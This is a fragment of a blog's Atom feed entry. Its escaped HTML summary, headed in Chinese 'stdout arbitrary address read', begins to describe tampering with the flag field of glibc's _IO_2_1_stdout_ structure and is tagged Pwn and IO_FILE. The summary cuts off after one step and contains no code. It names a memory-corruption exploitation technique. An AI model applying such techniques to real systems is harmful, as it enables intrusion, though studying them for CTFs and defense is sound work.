    <summary type="html">&lt;h2 id=&quot;stdout任意地址读&quot;&gt;&lt;a href=&quot;#stdout任意地址读&quot; class=&quot;headerlink&quot; title=&quot;stdout任意地址读&quot;&gt;&lt;/a&gt;stdout任意地址读&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;通过篡改_IO_2_1_stdout_结构体中的flag</summary>
      
    
    
    
    <category term="IO_FILE" scheme="https://jamorant12138.github.io/categories/IO-FILE/"/>
    
    
    <category term="Pwn" scheme="https://jamorant12138.github.io/tags/Pwn/"/>
    
  </entry>
  
</feed>
